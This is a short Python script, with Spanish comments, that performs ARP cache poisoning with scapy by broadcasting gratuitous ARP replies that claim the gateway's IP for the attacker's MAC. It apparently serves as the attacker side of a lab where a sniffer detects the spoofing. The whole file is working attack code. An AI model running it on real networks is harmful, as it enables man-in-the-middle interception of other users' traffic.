#!/usr/bin/env python3
"""Atacante que envenena la cache ARP: manda ARP replies (broadcast) diciendo que
la IP del gateway le pertenece a EL (su MAC). Un MITM clasico. El sniffer capta
los ARP con MAC duplicada para la IP del gateway.

MITRE ATT&CK: T1557.002 (ARP Cache Poisoning)."""
import os
import socket
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp, conf

GATEWAY = os.environ.get("GATEWAY", "gateway")
START_DELAY = int(os.environ.get("START_DELAY", "6"))


def log(m):
    print(m, flush=True)


def main():
    time.sleep(START_DELAY)
    try:
        gw_ip = socket.gethostbyname(GATEWAY)
    except OSError:
        gw_ip = GATEWAY
    my_mac = get_if_hwaddr(conf.iface)
    log(f"[attacker] ARP spoofing: reclamo la IP del gateway {gw_ip} con mi MAC {my_mac}")
    # Gratuitous ARP en broadcast: "gw_ip esta en my_mac".
    pkt = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, psrc=gw_ip, hwsrc=my_mac, pdst=gw_ip, hwdst="ff:ff:ff:ff:ff:ff"
    )
    for i in range(20):
        sendp(pkt, verbose=0)
        time.sleep(0.4)
    log("[attacker] envenenamiento ARP completado.")
    open("/tmp/session_done", "w").close()
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
